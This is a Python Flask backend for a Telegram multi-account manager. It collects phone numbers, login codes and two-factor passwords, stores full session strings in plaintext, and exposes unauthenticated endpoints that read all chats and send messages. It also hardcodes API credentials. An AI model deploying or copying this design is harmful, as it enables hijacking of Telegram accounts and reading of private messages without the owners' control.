from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument, 
    DocumentAttributeAudio, DocumentAttributeVideo
)
import json
import os
import asyncio
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
accounts = []  # All accounts
temp_sessions = {}  # Temporary OTP sessions

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Load accounts on startup
load_accounts()

# -------------------- PAGE ROUTES --------------------
@app.route('/')
def home():
    try:
        return send_file('login.html')
    except Exception as e:
        logger.error(f"Error serving login.html: {e}")
        return "login.html not found", 404

@app.route('/login')
def login():
    try:
        return send_file('login.html')
    except:
        return "login.html not found", 404

@app.route('/dashboard')
def dashboard():
    try:
        return send_file('dashboard.html')
    except:
        return "dashboard.html not found", 404

# -------------------- API ROUTES --------------------

# Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown')
        })
    return jsonify({'success': True, 'accounts': formatted})

# Send OTP
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Verify code
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Create new account
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        # Clean up temp session
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Get chats and messages - FIXED VERSION
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    logger.info(f"Fetching chats for account {account_id}")
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Check if authorized
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            # Get all dialogs (chats)
            dialogs = await client.get_dialogs()
            logger.info(f"Found {len(dialogs)} dialogs")
            
            chats = []
            all_messages = []
            
            for dialog in dialogs:
                if not dialog or not dialog.entity:
                    continue
                
                # Get chat ID properly
                chat_id = str(dialog.id)
                if dialog.is_user and hasattr(dialog.entity, 'username') and dialog.entity.username:
                    chat_id = f"@{dialog.entity.username}"
                
                # Determine chat type
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                elif dialog.is_user and hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                    chat_type = 'bot'
                
                # Get chat name
                if dialog.is_user:
                    if hasattr(dialog.entity, 'first_name'):
                        name = f"{dialog.entity.first_name or ''}"
                        if hasattr(dialog.entity, 'last_name') and dialog.entity.last_name:
                            name += f" {dialog.entity.last_name}"
                    else:
                        name = dialog.name or 'User'
                else:
                    name = dialog.name or 'Unknown'
                
                # Get last message
                last_msg = ''
                last_date = 0
                last_msg_media = None
                
                if dialog.message:
                    if dialog.message.text:
                        last_msg = dialog.message.text[:100]
                        if len(dialog.message.text) > 100:
                            last_msg += '...'
                    elif dialog.message.media:
                        if isinstance(dialog.message.media, MessageMediaPhoto):
                            last_msg = '📷 Photo'
                            last_msg_media = 'photo'
                        elif isinstance(dialog.message.media, MessageMediaDocument):
                            # Check if it's a video or document
                            attrs = dialog.message.media.document.attributes
                            is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
                            is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
                            
                            if is_video:
                                last_msg = '🎥 Video'
                                last_msg_media = 'video'
                            elif is_audio:
                                for attr in attrs:
                                    if isinstance(attr, DocumentAttributeAudio):
                                        if attr.voice:
                                            last_msg = '🎤 Voice'
                                            last_msg_media = 'voice'
                                        else:
                                            last_msg = '🎵 Audio'
                                            last_msg_media = 'audio'
                                        break
                            else:
                                last_msg = '📎 Document'
                                last_msg_media = 'document'
                        else:
                            last_msg = '📎 Media'
                            last_msg_media = 'media'
                    
                    if dialog.message.date:
                        last_date = int(dialog.message.date.timestamp())
                
                # Add to chats list
                chats.append({
                    'id': chat_id,
                    'title': name,
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': last_msg,
                    'lastMessageMedia': last_msg_media,
                    'lastMessageDate': last_date
                })
                
                # Get recent messages (limit 15)
                try:
                    messages = await client.get_messages(dialog.entity, limit=15)
                    
                    for msg in messages:
                        if not msg:
                            continue
                        
                        # Message text
                        msg_text = msg.text or ''
                        media_type = None
                        
                        # Check for media
                        if msg.media:
                            if isinstance(msg.media, MessageMediaPhoto):
                                media_type = 'photo'
                                if not msg_text:
                                    msg_text = '📷 Photo'
                            elif isinstance(msg.media, MessageMediaDocument):
                                # Check document type
                                attrs = msg.media.document.attributes
                                is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
                                is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
                                
                                if is_video:
                                    media_type = 'video'
                                    if not msg_text:
                                        msg_text = '🎥 Video'
                                elif is_audio:
                                    for attr in attrs:
                                        if isinstance(attr, DocumentAttributeAudio):
                                            if attr.voice:
                                                media_type = 'voice'
                                                if not msg_text:
                                                    msg_text = '🎤 Voice'
                                            else:
                                                media_type = 'audio'
                                                if not msg_text:
                                                    msg_text = '🎵 Audio'
                                            break
                                else:
                                    media_type = 'document'
                                    if not msg_text:
                                        msg_text = '📎 Document'
                            else:
                                media_type = 'media'
                                if not msg_text:
                                    msg_text = '📎 Media'
                        
                        # Message date
                        msg_date = 0
                        if msg.date:
                            msg_date = int(msg.date.timestamp())
                        
                        all_messages.append({
                            'chatId': chat_id,
                            'text': msg_text,
                            'date': msg_date,
                            'out': msg.out or False,
                            'id': msg.id,
                            'hasMedia': msg.media is not None,
                            'mediaType': media_type
                        })
                        
                except Exception as e:
                    logger.error(f"Error getting messages for {chat_id}: {e}")
                    continue
            
            logger.info(f"Returning {len(chats)} chats and {len(all_messages)} messages")
            
            return {
                'success': True,
                'chats': chats,
                'messages': all_messages
            }
            
        except Exception as e:
            logger.error(f"Error in fetch: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in get-messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Get entity
            try:
                if chat_id.startswith('-100'):
                    entity = await client.get_entity(int(chat_id))
                elif chat_id.startswith('@'):
                    entity = await client.get_entity(chat_id)
                else:
                    try:
                        entity = await client.get_entity(int(chat_id))
                    except ValueError:
                        entity = await client.get_entity(chat_id)
            except Exception as e:
                logger.error(f"Error getting entity: {e}")
                return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            logger.error(f"Send error: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

# Health check
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_sessions),
        'files': {
            'login.html': os.path.exists('login.html'),
            'dashboard.html': os.path.exists('dashboard.html'),
            'accounts.json': os.path.exists(ACCOUNTS_FILE)
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('TELEGRAM MANAGER - FIXED CHAT LOADING')
    print('='*50)
    print(f'Port: {port}')
    print(f'Accounts loaded: {len(accounts)}')
    print(f'login.html exists: {os.path.exists("login.html")}')
    print(f'dashboard.html exists: {os.path.exists("dashboard.html")}')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port, debug=False)
